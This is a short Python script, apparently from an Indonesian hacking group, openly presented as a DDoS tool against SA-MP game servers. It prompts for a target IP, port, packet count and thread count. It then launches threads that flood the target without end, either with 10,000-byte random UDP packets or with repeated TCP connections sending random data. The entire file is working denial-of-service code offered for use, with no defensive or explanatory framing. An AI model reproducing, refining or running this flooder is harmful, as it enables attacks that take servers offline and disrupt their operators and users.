#!/usr/bin/env python3
#shceezy
#xdteamtoolsddos
import random
import socket
import threading

print("""
\u001b[31m
TOOL DDOS FOR SAMP || TCP UDP
>> Coded : Shceezy
>> team: xd team
>> SELAMAT MENCOBA TOOLS NYA""")
ip = str(input(" IP TARGET:"))
port = int(input(" PORT TARGET:"))
choice = str(input(" SLES Y(y/n):"))
times = int(input(" PACKETS:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(10000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ATTACK TO IP AND PORT TARGET !!!")
		except:
			print("[!] ATTACK TO IP AND PORT TARGET !!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" ATTACK TO IP AND PORT TARGET !!!")
		except:
			s.close()
			print("[*] ATTACK TO IP AND PORT TARGET !!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()